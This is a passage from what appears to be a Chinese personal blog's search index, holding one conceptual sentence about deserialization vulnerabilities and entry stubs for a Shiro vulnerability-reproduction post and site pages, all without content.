154047.png)</p><p>可见在反序列化时，可能会给恶意代码提供可乘之机<br>如果反序列化执行的是恶意构造的字节序列，那么漏洞就产生了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shiro漏洞复现</title>
      <link href="/2022/06/14/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/06/14/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>游戏精彩时刻</title>
      <link href="/game/index.html"/>
      <url>/game/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于我</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>我的豆瓣</title>
      <link href="/movies/index.html"/>
      <url>/movies/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
